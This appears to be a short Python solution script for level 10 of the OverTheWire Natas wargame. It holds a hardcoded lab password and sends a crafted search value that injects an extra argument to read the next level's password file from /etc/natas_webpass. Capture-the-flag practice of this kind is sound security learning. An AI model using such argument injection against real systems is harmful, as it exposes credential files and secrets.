import requests
import re

username = "natas10"
password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"

url = "http://natas10.natas.labs.overthewire.org/"

session = requests.session()

response = session.post(url, data={"needle":". /etc/natas_webpass/natas11", "submit":"submit"}, auth=(username, password))
content = (response.text)

flag = re.findall("/etc/natas_webpass/natas11:(.*)", content)[0]
print(flag)